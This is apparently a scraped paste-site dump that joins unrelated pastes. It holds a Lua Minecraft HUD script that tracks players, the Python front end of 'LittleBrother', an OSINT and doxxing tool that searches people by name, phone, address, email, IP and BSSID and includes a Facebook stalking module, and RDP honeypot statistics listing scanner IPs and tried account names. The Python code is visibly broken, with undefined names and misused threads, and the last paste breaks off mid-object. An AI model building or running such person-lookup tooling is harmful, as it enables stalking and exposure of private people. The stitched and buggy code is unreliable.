    {""minecraft:redstone_block"", 0}
}
----------------------BL-------------------------------------------
local blackList = {
    ""krissss"",
    ""AliceWay"", 
    ""sima21"",
    ""SkyDrive_"", 
    ""Phenomenoon"",
    ""jewiven"", 
    ""_Desert_Eagle_"",
    ""Samaya"",
}

local players = {
  {""combomaster"", false}, 
  {""cheburek228tr"", false},
  {""kertakos1"", false},
  {""Darlaxx"", false},
  {""Deynader"", false},
  {""Heart_182"", false}, 
  {""Klarck"", false},
  {""M0ney"", false},
  {""Sava_Sava_Sava"", false},
  {""Skorkill"", false},
  {""DgSkyVoker"", false},
  {""aleks03_0"", false},
  {""TheLastCreeperMS"", false},
}
-------------------------------------
local component = require(""component"")

local average_counter = {
  molecular = {
    proxy=component.proxy(""f81ad1b6-d899-4abc-a103-680d352982cd""),
    icon=""AdvancedSolarPanel:BlockMolecularTransformer"",
    use=true,
	coordinates = {x = 1, y = 90},
    color = colors.orange,
  },
  ractor = {
    proxy=component.proxy(""b49877bd-d300-4130-b40b-93e14764530e""),
    icon=""dwcity:PalladiumReactorChamber"",
    use=true,
	coordinates = {x = 1, y = 70},
    color = colors.green,
  },
  solar = {
    proxy=component.proxy(""5fd94997-989c-4bd5-8497-74cd2248d1a4""),
    icon=""AdvancedSolarPanel:BlockAdvSolarPanel"",
    use=true,
	coordinates = {x = 1, y = 50},
    color = colors.blue,
  }  
}
-------------------------------------
local admins = {""combomaster""}
local chat_box_name = ""¬ß8[¬ß4–ê–ª–∏—Å–∞¬ß8]""
-------------------------------------- 
local chat_box, me, sensor, counter, bridge, redstone
local working, euWorking, average, cb, me_a, s, bridgeCom, redstoneCom, allow_mem = true, true, false, false, false, false,
    false, false, false
local TC, RO, RN, RD, TPS = 2, 0, 0, 0, 0
local strTPS = """"
local listeners = {}
 
local redstoneSide = 4
local TIME_ZONE = 3
local widthBox = 90
local transBox = 0.2
 

local function isAdmin(name)
   for _, m in pairs(admins) do
      if m == name then
        return true
       end
end
    return false
end
 
local function check()

	if com.isAvailable(""chat_box"") then
    	cb = true
    chat_box = com.chat_box
    chat_box.setName(chat_box_name)
  end
    if com.isAvailable(""average_counter"") then
        average = true
        counter = com.average_counter
    end
    if com.isAvailable(""openperipheral_bridge"") then
        bridgeCom = true
        bridge = com.openperipheral_bridge
    end
    if com.isAvailable(""me_interface"") then
        me_a = true
        me = com.me_interface
    end
    if com.isAvailable(""openperipheral_sensor"") then
        s = true
        sensor = com.openperipheral_sensor
    end
    if com.isAvailable(""redstone"") then
        redstoneCom = true
        redstone = com.redstone
    end
 
    return false
end
 
local function addAdmins()
   for i = 1, #admins do
       computer.addUser(admins[i])
    end
    return false
end
 
local function getTime()
    local f = io.open(""/tmp/TF"", ""w"")
    f:write(""test"")
    f:close()
    return (fs.lastModified(""/tmp/TF""))
end
 
local function addBox(x, y, w, h, color, tran)
    return bridge.addBox(x, y, w, h, color, tran)
end
 
local function addText(x, y, text, color)
    return bridge.addText(x, y, text, color)
end
 
local function addIcon(x, y, name, meta)
    return bridge.addIcon(x, y, name, meta)
end
 
local function getSize(name, dmg)
    for _, item in ipairs(me.getItemsInNetwork()) do
        if item.name == name and item.damage == dmg then
            return item.size
        end
    end
    return 0
end
 
local function string_number(num)
    local answer = """"
    local reverse_num = {}
    local num = tostring(num):gsub(""."", function(c)
        table.insert(reverse_num, c)
    end)
    for index, _ in pairs(reverse_num) do
        answer = answer .. reverse_num[#reverse_num - index + 1]
        if index % 3 == 0 and index ~= #reverse_num then
            answer = answer .. "" ""
        end
    end
    return answer:reverse()
end
--------------------------TPS---------------------------------------- 
local function drawTPS()
    local TPS = {}
    local avgTPS = 0

   
    for tSlot=1, 3 do
        TPS[tSlot] = 0
    end

  
    for tSlot = 1, 3 do
        local realTimeOld = getTime()
        os.sleep(timeConstant)
        local realTimeNew = getTime()
        local realTimeDiff = realTimeNew - realTimeOld    
        TPS[tSlot] = 20000 * timeConstant / realTimeDiff
        avgTPS = (TPS[1] + TPS[2] + TPS[3]) / 3
    end


    local color
    if avgTPS > 18 then
        color = 0x00FF00
    elseif avgTPS > 16 then
        color = 0xAAFF00
    elseif avgTPS > 14 then
        color = 0xFFFF00
    elseif avgTPS > 12 then
        color = 0xFFAA00
    else
        color = 0xFF4400
    end


    local x = 1
    local y = 12
    local width = widthBox
    local height = 17


    addBox(x, y, width, height, colors.black, transBox)


    local textOffsetX = 15 
    local textX = x + textOffsetX
    local textY = y + 5 

    addText(textX, textY, string.format(""TPS: %.1f"", avgTPS), color)

    return avgTPS
end
----------------------------TIME--------------------------------------------- 
local function drawTime()
    local time = getTime()
    local lastmod = tonumber(string.sub(time, 1, -4)) + TIME_ZONE * 3600
    local dt = os.date('%H:%M', lastmod)

    local x = 1
    local y = 31
    local width = widthBox
    local height = 17
    local backgroundColor = colors.black
    local transparency = transBox

    addBox(x, y, width, height, backgroundColor, transparency)

    local textX = x + 5
    local textY = y + 5

    local textColor = colors.e

    addText(textX, textY, ""–í—Ä–µ–º—è "" .. dt, textColor)
end
-----------------------------------EU--------------------------------------------- 
local function drawEnergy()

  for device, counter in pairs(average_counter) do
    if counter.use then
      local averageEU = counter.proxy.getAverage()
      local av = """"
      
      if averageEU / 1000 <= 1 then
        av = string.format(""%.3f EU/t"", averageEU)
      elseif averageEU / 1000000 >= 1 then
        av = string.format(""%.3f M EU/t"", averageEU / 1000000)
      else
        av = string.format(""%.1f k EU/t"", averageEU / 1000)
      end

      addBox(counter.coordinates.x, counter.coordinates.y, widthBox, 18, colors.black, transBox)
      addIcon(counter.coordinates.x + 2, counter.coordinates.y + 3, counter.icon, 0)
            
      if device == ""molecular"" then
        if euWorking then
          addText(counter.coordinates.x + 21, counter.coordinates.y + 7, av, counter.color)
        else
          -- –ï—Å–ª–∏ `euWorking` –ª–æ–∂—å, –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º ""–í—ã–∫–ª—é—á–µ–Ω–æ""
          addText(counter.coordinates.x + 21, counter.coordinates.y + 7, ""–í—ã–∫–ª—é—á–µ–Ω–æ"", colors.red)
        end
      else
        addText(counter.coordinates.x + 21, counter.coordinates.y + 7, av, counter.color)
      end
    end
  end
end
-------------------------------------ITEMS------------------------------------------------------- 
local function drawItems()
    if me_a then
        local y = 115
        addBox(1, y - 5, widthBox, #items * 19, colors.black, transBox)
 
        for i = 1, #items do
            addIcon(3, y - 4, items[i][1], items[i][2])
            addText(25, y, string_number(getSize(items[i][1], items[i][2])), colors.blue)
            y = y + 18
        end
    end
    return
end
----------------------------------------RADAR------------------------------------------ 
local function drawNearPlayers()
    if s then
        local yPos = 205
        local temp = sensor.getPlayers()
        local boxHeight = 17
        local playerSpacing = 10

        -- –†–∏—Å—É–µ–º –≤–µ—Ä—Ö–Ω–∏–π –±–æ–∫—Å —Å –∑–∞–≥–æ–ª–æ–≤–∫–æ–º
        addBox(1, yPos, widthBox, boxHeight, colors.black, transBox)
        addText(3, yPos + 5, ""¬ße|| –ò–≥—Ä–æ–∫–∏ —Ä—è–¥–æ–º: ¬ßa"" .. #temp, colors.white)

        -- –ò–Ω–∫—Ä–µ–º–µ–Ω—Ç–∏—Ä—É–µ–º yPos –¥–ª—è —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç—Ä–æ–∫–∏ —Ç–µ–∫—Å—Ç–∞
        yPos = yPos + boxHeight

        -- –†–∏—Å—É–µ–º —Å–ø–∏—Å–æ–∫ –∏–≥—Ä–æ–∫–æ–≤
        for i = 1, #temp do
            local isBlacklisted = false
            for j = 1, #blackList do
                if temp[i].name == blackList[j] then
                    isBlacklisted = true
                    break
                end
            end
            
            -- –ï—Å–ª–∏ –∏–≥—Ä–æ–∫ –Ω–µ –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ, —Ä–∏—Å—É–µ–º –µ–≥–æ –∏–º—è
            if not isBlacklisted then
                addBox(1, yPos, widthBox, boxHeight, colors.black, transBox)
                addText(4, yPos + 5, temp[i].name, colors.white)
                yPos = yPos + playerSpacing  -- –≤–º–µ—Å—Ç–æ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –≤—ã—Å–æ—Ç—É –±–æ–∫—Å–∞ –ø–ª—é—Å –æ—Ç—Å—Ç—É–ø
            end
        end
    end
    return
end
--------------------------------------------------------------------------------------------
local function drawMemory()
    local free_memory = computer.freeMemory()
    local totalMemory = computer.totalMemory()
 
    if free_memory / 1024 < 1024 then
        computer.shutdown(true)
    end
    if allow_mem then
        addText(widthBox + 3, 5,
            math.floor((free_memory / 1024)) .. ""mb"" .. ""/"" .. math.floor((totalMemory / 1024)) .. ""mb"" .. "" "" ..
                math.floor(((free_memory / totalMemory) * 100)) .. ""%"", colors.f)
    end
end
 
local function chatMonitoring(_, _, name, _, msg)
    if isAdmin(name) then
        if msg == ""-t"" then
            euWorking = not euWorking
            if euWorking then
                redstone.setOutput(redstoneSide, 0)
            else
                redstone.setOutput(redstoneSide, 15)
            end
        end
        if msg == ""-m"" then
            allow_mem = not allow_mem
        end
        if msg == ""-rb"" then
            computer.shutdown(true)
        end
    end
end


local function chatListener()
    local listenerId = event.listen(""glasses_chat_message"", chatMonitoring)
    table.insert(listeners, listenerId)
end
 
local function quit(_, _, _, key)
    if key ~= 16 then
        return
    end
 
    for i = 1, #listeners do
        event.cancel(listeners[i])
    end
 
    gpu.setBackground(colors.black)
    gpu.setForeground(0xFFFFFF)
    term.clear()
 
    working = false
end
 
local function keyListener()
    local listenerId = event.listen(""key_down"", quit)
 
    table.insert(listeners, listenerId)
end
 
local function status()
    gpu.setBackground(colors.black)
 
    gpu.setForeground(colors.green)
    gpu.set(1, 1, ""Components status:"")
    gpu.setForeground(colors.e)
 
    gpu.set(1, 2, ""average_counter: "" .. tostring(average))
    gpu.set(1, 3, ""me_interface: "" .. tostring(me_a))
    gpu.set(1, 4, ""openperipheral_sensor: "" .. tostring(s))
    gpu.set(1, 5, ""openperipheral_bridge: "" .. tostring(bridgeCom))
    gpu.set(1, 6, ""redstone: "" .. tostring(redstoneCom))
 
    gpu.setForeground(colors.green)
    gpu.set(1, 8, ""Arguments constants:"")
    gpu.setForeground(colors.e)
 
    gpu.set(1, 9, ""Redstone side: "" .. tostring(redstoneSide))
    gpu.set(1, 10, ""TIME_ZONE: "" .. tostring(TIME_ZONE))
    gpu.set(1, 11, ""Memory showing: "" .. tostring(allow_mem))
    gpu.set(1, 12, ""EU working: "" .. tostring(euWorking))
 
    gpu.setForeground(colors.green)
    gpu.set(1, 14, ""Allowed commands:"")
    gpu.setForeground(colors.e)
 
    gpu.set(1, 15, ""-t -- on/off –º–æ–ª–µ–∫—É–ª—è—Ä–∫–∞"")
    gpu.set(1, 16, ""-m -- on/off mem"")
    ---gpu.set(1, 17, ""-rb -- reboot"")
    -- gpu.set(1, 18, ""-setRestoneSide <num> -- –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —Å—Ç–æ—Ä–æ–Ω—ã –∫—Ä–∞—Å–Ω–æ–≥–æ –∫–∞–º–Ω—è"")
end
 
addAdmins()
check()
bridge.clear()
addText(300, 150, ""HELLO"", colors.blue)
bridge.sync()
chatListener()
keyListener()
redstone.setOutput(redstoneSide, 0)
term.clear()
 
while working do
    bridge.clear()
    check()
    status()
    drawTPS()
    drawTime()
    drawItems()
    drawNearPlayers()
    drawEnergy()
    drawMemory()
    os.sleep(0.5)
    bridge.sync()
end"
CdwfBAYG,GhostDoxxer,xGHOSTSECx,Python,Thursday 4th of January 2024 07:26:36 PM CDT,"python
import sys
import os
import time
import random
import threading
import requests
import json
from colorama import init, Fore
from datetime import date
from googlesearch import search
__version__ = 6.0
init()
warning = ""["" + Fore.RED + ""!"" + Fore.RESET + ""]""
question = ""["" + Fore.YELLOW + ""?"" + Fore.RESET + ""]""
information = ""["" + Fore.BLUE + ""I"" + Fore.RESET + ""]""
wait = ""["" + Fore.MAGENTA + ""*"" + Fore.RESET + ""]""
found = ""["" + Fore.GREEN + ""+"" + Fore.RESET + ""]""
tiret = ""["" + Fore.CYAN + ""-"" + Fore.RESET + ""]""
def check_version():
    version = sys.version[:1]
    if int(version) != 3:
        sys.exit(warning + "" Please run the script with Python version 3."")
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def load_lib():
    from core.bssidFinder import bssidFinder
    from core.employee_lookup import employee_lookup
    from core.google import google
    from core.hashDecrypt import hashdecrypt
    from core.ipFinder import ipFinder
    from core.mailToIP import mailToIP
    from core.profilerFunc import profilerFunc
    from core.searchAddress import searchAddress
    from core.searchTwitter import searchTwitter
    from core.searchPerson import searchPerson
    from core.searchInstagram import searchInstagram
    from core.searchUsername import searchUsername
    from core.searchNumber import searchNumber
    from core.searchEmail import SearchEmail
    from core.Profiler import Profiler
    from core.facebookStalk import facebookStalk
    global myip, mycountry, mycountrycode, database_path
    global bssidFinder, employee_lookup, google, hashdecrypt, ipFinder, mailToIP, profilerFunc
    global searchPerson, SearchEmail, searchInstagram, searchTwitter, searchNumber, searchAddress, searchUsername, facebookStalk
    global Profiler
    myip = requests.get(""https://api.ipify.org/"").text
    mycountry_info = requests.get(""http://ip-api.com/json/"" + myip).text
    country_data = json.loads(mycountry_info)
    mycountry = country_data['country']
    mycountrycode = country_data['countryCode']
    database_path = os.path.abspath(__file__).split(""\\"")[:-1]
    database_path = ""\\"".join(database_path) + ""\\Watched""
    if not os.path.exists(database_path):
        os.mkdir(database_path)
def loading_hack(importlib):
    loading_text = ""[*]"" + ' Starting LittleBrother...'
    special_chars = ""$*.X^%_/\\#~!?;""
    while importlib.is_alive():
        loading_bar = """"
        for char in loading_text:
            loading_bar += char
            random_chars = random.choice(special_chars) + random.choice(special_chars) + random.choice(special_chars)
            if len(loading_bar + random_chars) <= len(loading_text):
                pass
            else:
                random_chars = """"
            sys.stdout.write('\r' + loading_bar + random_chars)
            time.sleep(0.06)
def loading_upper(importlib):
    string = ""Start littlebrother""
    string = list(string)
    num_chars = len(string)
    while importlib.is_alive():
        x = 0
        while x < num_chars:
            char = string[x]
            char = char.upper()
            string[x] = char
            sys.stdout.write(""\r[*] "" + ''.join(string) + '...')
            time.sleep(0.1)
            char = string[x]
            char = char.lower()
            string[x] = char
            x += 1
def loading_text_print(importlib):
    string = ""Start littlebrother""
    while importlib.is_alive():
        space = "" "" * 100
        sys.stdout.write(""\r"" + space)
        x = 1
        while x <= len(string):
            delay = ""0.""
            delay += str(random.choice(range(1, 3)))
            sys.stdout.write(""\rroot@littlebrother:~$ "" + string[:x] + ""|"")
            time.sleep(float(delay))
            x += 1
def thread_loading():
    num = random.choice([1, 2, 3])
    importlib = threading.Thread(target=load_lib)
    importlib.start()
    if num == 1:
        load = threading.Thread(target=loading_hack(importlib))
    elif num == 2:
        load = threading.Thread(target=loading_upper(importlib))
    elif num == 3:
        load = threading.Thread(target=loading_text_print(importlib))
    load.start()
    importlib.join()
    load.join()
thread_loading()
def times():
    return time.strftime(""%H:%M:%S"")
today_date = date.today()
def main():
    start_time = time.time()
    check_version()
    clear()
    Core.little_logo()
    print(warning + "" We are not responsible for your actions."")
    print(warning + "" This program is illegal to use on someone without their consent."")
    print(warning + "" Some functions use open APIs, we are not responsible if they are removed."")
    print(information + "" Current version:"", __version__)
    print(warning + "" If you face missing module issues, run 'pip install -r requirements.txt'"")
    
    while True:
        try:
            search = input(""\n"" + wait + "" Search: "")
        except KeyboardInterrupt:
            print(""\n"" + wait + "" Stopping LittleBrother..."")
            sys.exit()
            
        if search == """":
            print(warning + "" You must enter a search query."")
        elif search == ""help"":
            print(wait + "" searchName [name]: Search for a name on social networks. (Twitter, Instagram, Facebook, LinkedIn)"")
            print(wait + "" searchUsername [username]: Search for a username on social networks. (Twitter, Instagram, Facebook, LinkedIn)"")
            print(wait + "" searchEmail [email]: Search for an email on social networks. (Twitter, Instagram, Facebook, LinkedIn)"")
            print(wait + "" searchIP [ip]: Search for information about an IP address. (Location on map, domain, email search)"")
            print(wait + "" searchPhone [phone number]: Search for information about a phone number. (Owner information)"")
            print(wait + "" searchAddress [address]: Search for information about an address. (Google Maps, social network search)"")
            print(wait + "" bssidFinder [BSSID]: Find the location on the map of a MAC address / BSSID."")
            print(wait + "" prof [name]: Search for information about a name."")
            print(wait + "" google [search]: Search on Google."")
            print(wait + "" checkVersion: Check if you have the latest version of LittleBrother."")
            print(wait + "" exit: Close the program."")
            print(wait + "" help: Display this help message."")
            print(wait + "" clear: Clear the screen."")
        elif search == ""exit"":
            print(wait + "" Stopping LittleBrother..."")
            sys.exit()
        elif search == ""clear"":
            clear()
            Core.little_logo()
        elif search == ""checkVersion"":
            Core.check_version()
        elif ""searchName"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter a name."")
                else:
                    searchPersonne.search_personne(search[1])
            except IndexError:
                print(warning + "" You must enter a name."")
        elif ""searchUsername"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter a username."")
                else:
                    searchUserName.search_username(search[1])
            except IndexError:
                print(warning + "" You must enter a username."")
        elif ""searchEmail"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter an email."")
                else:
                    SearchEmail.search_email(search[1])
            except IndexError:
                print(warning + "" You must enter an email."")
        elif ""searchIP"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter an IP address."")
                else:
                    ipFinder.ip_finder(search[1])
            except IndexError:
                print(warning + "" You must enter an IP address."")
        elif ""searchPhone"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter a phone number."")
                else:
                    searchNumber.search_number(search[1])
            except IndexError:
                print(warning + "" You must enter a phone number."")
        elif ""searchAddress"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter an address."")
                else:
                    searchAdresse.search_adresse(search[1])
            except IndexError:
                print(warning + "" You must enter an address."")
        elif ""bssidFinder"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter a MAC address / BSSID."")
                else:
                    bssidFinder.bssid_finder(search[1])
            except IndexError:
                print(warning + "" You must enter a MAC address / BSSID."")
        elif ""prof"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter a name."")
                else:
                    Profiler.profiler_func(search[1])
            except IndexError:
                print(warning + "" You must enter a name."")
        elif ""google"" in search:
            search = search.split("" "")
            try:
                if search[1] == """":
                    print(warning + "" You must enter a search query."")
                else:
                    google.google_func(search[1])
            except IndexError:
                print(warning + "" You must enter a search query."")
        else:
            print(warning + "" Search not found."")
if __name__ == ""__main__"":
    main()
"
mpZ7t0sk,2024-01-04_stats.json,rdp_snitch,JSON,Thursday 4th of January 2024 06:18:12 PM CDT,"{
  ""ip"": {
    ""148.163.53.163"": 6,
    ""208.234.0.26"": 27,
    ""194.165.17.21"": 78,
    ""109.69.7.157"": 12,
    ""124.225.77.47"": 3,
    ""74.105.22.130"": 54,
    ""185.170.144.113"": 3,
    ""198.235.24.123"": 18,
    ""31.41.244.83"": 3,
    ""194.165.16.73"": 6,
    ""87.251.75.145"": 9,
    ""103.184.47.83"": 3,
    ""62.204.41.208"": 9,
    ""81.23.154.115"": 3,
    ""67.133.192.80"": 3,
    ""185.170.144.3"": 12,
    ""51.75.160.42"": 12,
    ""179.60.147.118"": 3,
    ""167.94.146.52"": 3,
    ""205.210.31.72"": 18,
    ""45.86.81.112"": 12,
    ""61.78.123.204"": 6,
    ""62.122.184.188"": 3,
    ""173.237.25.68"": 6,
    ""172.232.163.128"": 12,
    ""88.214.25.57"": 3,
    ""94.102.61.23"": 3,
    ""45.227.254.55"": 6,
    ""165.154.138.85"": 3,
    ""80.79.117.42"": 3,
    ""58.218.204.183"": 9,
    ""81.19.135.47"": 3,
    ""80.66.76.149"": 3,
    ""198.235.24.66"": 18,
    ""46.245.64.10"": 3,
    ""184.105.139.67"": 3,
    ""36.139.61.15"": 3,
    ""138.68.232.164"": 9,
    ""45.79.13.183"": 3,
    ""50.116.32.103"": 3,
    ""194.165.16.76"": 6,
    ""198.235.24.84"": 18,
    ""62.204.41.199"": 3
  },
  ""asn"": {
    ""AS53755"": 6,
    ""AS10843"": 27,
    ""AS48721"": 90,
    ""AS21183"": 12,
    ""AS4134"": 12,
    ""AS701"": 54,
    ""AS197414"": 15,
    ""AS396982"": 72,
    ""AS57678"": 3,
    ""AS208091"": 12,
    ""AS146817"": 3,
    ""AS59425"": 12,
    ""AS12389"": 3,
    ""AS209"": 3,
    ""AS16276"": 12,
    ""AS209588"": 6,
    ""AS398705"": 3,
    ""AS205516"": 12,
    ""AS4766"": 6,
    ""AS57523"": 3,
    ""AS7979"": 6,
    ""AS63949"": 18,
    ""AS29551"": 3,
    ""AS202425"": 3,
    ""AS267784"": 6,
    ""AS135377"": 3,
    ""AS34702"": 3,
    ""AS43754"": 3,
    ""AS6939"": 3,
    ""AS56041"": 3,
    ""AS14061"": 9
  },
  ""isp"": {
    ""Input Output Flood LLC"": 6,
    ""Advanced Internet Technologies"": 27,
    ""Flyservers S.A."": 102,
    ""Vodafone Network"": 12,
    ""Hainan Network of ChinaTelecom"": 3,
    ""Verizon Business"": 54,
    ""Xhost Internet Solutions LP"": 27,
    ""Google LLC"": 72,
    ""Cat Technologies Co. Limited"": 3,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Horizon LLC"": 12,
    ""Rostelecom networks"": 3,
    ""CenturyLink"": 3,
    ""OVH SAS"": 12,
    ""Censys, Inc."": 3,
    ""NLS ASTANA LLP"": 12,
    ""Korea Telecom"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Servers.com, Inc."": 6,
    ""Akamai Technologies, Inc."": 18,
    ""NOC EMAIL: noc@one-host.net"": 3,
    ""IP Volume inc"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Aktsiaselts WaveCom"": 3,
    ""Chinanet"": 9,
    ""Asiatech Data Transmission company"": 3,
    ""Hurricane Electric LLC"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""DigitalOcean, LLC"": 9
  },
  ""org"": {
    ""rdpdaddy.com"": 6,
    ""Verizon Communications"": 27,
    ""Flyservers S.A"": 90,
    ""Unknown"": 27,
    ""Verizon Business"": 54,
    ""Xhostis"": 15,
    ""Palo Alto Networks, Inc"": 72,
    ""Red Bytes LLC"": 3,
    ""Xhost Internet Solutions"": 12,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Horizon LLC"": 12,
    ""JSC Teleset"": 3,
    ""CenturyLink, Inc"": 3,
    ""OVH Ltd"": 12,
    ""Cloud Solutions S.A"": 3,
    ""Censys, Inc."": 3,
    ""Kornet"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Servers.com, Inc."": 6,
    ""Akamai Technologies, Inc."": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 3,
    ""AI Spera"": 3,
    ""UAB Host Baltic"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""EE Wavecom"": 3,
    ""Chinanet JS"": 9,
    ""Alviva Holding Limited"": 3,
    ""Asiatech Data Transmission Co."": 3,
    ""The Shadow Server Foundation"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""DigitalOcean, LLC"": 9,
    ""Linode"": 6
  },
  ""regionName"": {
    ""Arizona"": 6,
    ""North Carolina"": 27,
    ""Kaunas"": 90,
    ""Tirana"": 12,
    ""Hainan"": 3,
    ""New Jersey"": 57,
    ""North Holland"": 30,
    ""California"": 84,
    ""St.-Petersburg"": 3,
    ""Hubei"": 3,
    ""Moscow"": 15,
    ""Tatarstan Republic"": 3,
    ""England"": 12,
    ""Distrito Federal"": 3,
    ""Hesse"": 12,
    ""Astana"": 12,
    ""Seoul"": 6,
    ""Texas"": 9,
    ""Washington"": 12,
    ""Vilnius"": 6,
    ""Harjumaa"": 3,
    ""Jiangsu"": 9,
    ""Tehran"": 3,
    ""Zhejiang"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""United States"": 198,
    ""Lithuania"": 96,
    ""Albania"": 12,
    ""China"": 18,
    ""The Netherlands"": 30,
    ""Russia"": 21,
    ""United Kingdom"": 12,
    ""Venezuela"": 3,
    ""Germany"": 12,
    ""Kazakhstan"": 12,
    ""South Korea"": 6,
    ""Estonia"": 3,
    ""Iran"": 3
  },
  ""account"": {
    ""hello"": 42,
    ""142.93.8.59"": 171,
    ""(empty)"": 15,
    ""Domain"": 12,
    ""cGdGrplyf"": 3,
    ""PFLKXhbSR"": 3,
    ""gJVihJelI"": 3,
    ""seEZJVYNp"": 3,
    ""dcRZDO"": 3,
    ""zEcWmp"": 3,
    ""masscan"": 9,
    ""Test"": 57,
    ""Administr"": 24,
    ""PUAXZgmdG"": 3,
    ""PuVgNBeXf"": 3,
    ""vkLHCNCYo"": 3,
    ""mGxNTzuqp"": 3,
    ""dmAEkx"": 3,
    ""gKCgYC"": 3,
    ""nmap"": 3,
    ""Administrator"": 3,
    ""hIYSPmScP"": 3,
    ""ZZoSbQGEV"": 3,
    ""kJfWCRDYr"": 3,
    ""JNfROUgNG"": 3,
    ""sJRPWr"": 3,
    ""PlSMCW"": 3,
    ""rqio06ff"": 3,
    ""Unknown"": 9,
    ""chjno5zf"": 3,
    ""beio"": 3,
    ""lxZVQOxNt"": 3,
    ""VZCgSlrBx"": 3,
    ""byCdJjvJs"": 3,
    ""hQHzmAdRR"": 3,
    ""BJdepg"": 3,
    ""ImcFpR"": 3
  },
  ""keyboard"": {
    ""Unknown"": 351,
    ""English - United States"": 27,
    ""English - United Kingdom"": 48
  },
  ""client_build"": {
    ""Unknown"": 351,
    ""RDP 5.1"": 66,
    ""RDP 5.2"": 9
  },
  ""client_name"": {
    ""Unknown"": 351,
    ""MSTSC"": 12,
    ""EMP-LAP-0014"": 48,
    ""rdpscan"": 6,
    ""prod-beryllium-s"": 9
  },
  ""ip_type"": {
    ""hosting"": 153,
    ""Unknown"": 261,
    ""mobile"": 3,
    ""hosting & proxy"": 9
  }
}"
VH5Wy7g5,2024-01-04_stats.json,rdp_snitch,JSON,Thursday 4th of January 2024 06:16:12 PM CDT,"{
  ""ip"": {
    ""148.163.53.163"": 4,
    ""208.234.0.26"": 18,
    ""194.165.17.21"": 52,
    ""109.69.7.157"": 8,
    ""124.225.77.47"": 2,
    ""74.105.22.130"": 36,
    ""185.170.144.113"": 2,
    ""198.235.24.123"": 12,
    ""31.41.244.83"": 2,
    ""194.165.16.73"": 4,
    ""87.251.75.145"": 6,
    ""103.184.47.83"": 2,
    ""62.204.41.208"": 6,
    ""81.23.154.115"": 2,
    ""67.133.192.80"": 2,
    ""185.170.144.3"": 8,
    ""51.75.160.42"": 8,
    ""179.60.147.118"": 2,
    ""167.94.146.52"": 2,
    ""205.210.31.72"": 12,
    ""45.86.81.112"": 8,
    ""61.78.123.204"": 4,
    ""62.122.184.188"": 2,
    ""173.237.25.68"": 4,
    ""172.232.163.128"": 8,
    ""88.214.25.57"": 2,
    ""94.102.61.23"": 2,
    ""45.227.254.55"": 4,
    ""165.154.138.85"": 2,
    ""80.79.117.42"": 2,
    ""58.218.204.183"": 6,
    ""81.19.135.47"": 2,
    ""80.66.76.149"": 2,
    ""198.235.24.66"": 12,
    ""46.245.64.10"": 2,
    ""184.105.139.67"": 2,
    ""36.139.61.15"": 2,
    ""138.68.232.164"": 6,
    ""45.79.13.183"": 2,
    ""50.116.32.103"": 2,
    ""194.165.16.76"": 4,
    ""198.235.24.84"": 12,
    ""62.204.41.199"": 2
  },
  ""asn"": {
    ""AS53755"": 4,
    ""AS10843"": 18,
    ""AS48721"": 60,
    ""AS21183"": 8,
    ""AS4134"": 8,
    ""AS701"": 36,
    ""AS197414"": 10,
    ""AS396982"": 48,
    ""AS57678"": 2,
    ""AS208091"": 8,
    ""AS146817"": 2,
    ""AS59425"": 8,
    ""AS12389"": 2,
    ""AS209"": 2,
    ""AS16276"": 8,
    ""AS209588"": 4,
    ""AS398705"": 2,
    ""AS205516"": 8,
    ""AS4766"": 4,
    ""AS57523"": 2,
    ""AS7979"": 4,
    ""AS63949"": 12,
    ""AS29551"": 2,
    ""AS202425"": 2,
    ""AS267784"": 4,
    ""AS135377"": 2,
    ""AS34702"": 2,
    ""AS43754"": 2,
    ""AS6939"": 2,
    ""AS56041"": 2,
    ""AS14061"": 6
  },
  ""isp"": {
    ""Input Output Flood LLC"": 4,
    ""Advanced Internet Technologies"": 18,
    ""Flyservers S.A."": 68,
    ""Vodafone Network"": 8,
    ""Hainan Network of ChinaTelecom"": 2,
    ""Verizon Business"": 36,
    ""Xhost Internet Solutions LP"": 18,
    ""Google LLC"": 48,
    ""Cat Technologies Co. Limited"": 2,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Horizon LLC"": 8,
    ""Rostelecom networks"": 2,
    ""CenturyLink"": 2,
    ""OVH SAS"": 8,
    ""Censys, Inc."": 2,
    ""NLS ASTANA LLP"": 8,
    ""Korea Telecom"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Servers.com, Inc."": 4,
    ""Akamai Technologies, Inc."": 12,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""IP Volume inc"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Aktsiaselts WaveCom"": 2,
    ""Chinanet"": 6,
    ""Asiatech Data Transmission company"": 2,
    ""Hurricane Electric LLC"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""DigitalOcean, LLC"": 6
  },
  ""org"": {
    ""rdpdaddy.com"": 4,
    ""Verizon Communications"": 18,
    ""Flyservers S.A"": 60,
